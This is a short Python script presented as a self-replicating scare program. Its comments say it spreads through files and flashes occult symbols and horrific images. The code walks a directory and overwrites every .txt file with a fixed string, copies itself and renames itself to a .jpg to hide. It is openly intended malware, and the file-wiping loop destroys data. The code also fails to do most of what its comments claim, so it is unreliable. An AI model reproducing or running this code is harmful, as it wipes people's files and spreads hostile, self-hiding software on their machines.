# the purpose of the program is :
    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
        # which disappear almost immediately after their appearance.
    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
        # then disappears almost immediately. 
        # So as time goes by, more and more horrific images will be displayed, faster and more often.
    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.



import os
import shutil
from PIL import Image

# Navigate to the target directory
os.chdir('/path/to/target/directory')

# Modify files and create a copy of the script
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(root, file), 'w') as f:
                f.write('This file has been modified by the script')
        elif file == 'script.py':
            shutil.copy('script.py', os.path.join(root, 'copy_of_script.py'))

# Create and display a random image
image = Image.new('RGB', (500, 500))
image.show()

# Hide the script in user files
with open('hidden_file.txt', 'w') as f:
    f.write('This file contains occult symbols and images')
os.rename('script.py', 'hidden_file.jpg')
